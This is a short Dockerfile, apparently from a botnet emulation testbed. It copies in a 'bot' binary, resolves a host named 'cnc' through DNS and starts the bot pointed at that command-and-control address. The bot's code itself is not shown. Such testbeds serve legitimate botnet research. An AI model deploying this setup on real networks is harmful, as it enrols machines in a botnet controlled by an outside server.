FROM ubuntu:14.04.5
ADD bot /
RUN apt-get update \
	&& apt-get install -y dnsutils
CMD IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'` && CNC=`nslookup cnc | awk '/^Address: / { print $2 }'` && /bot $CNC $IP $CNC 0
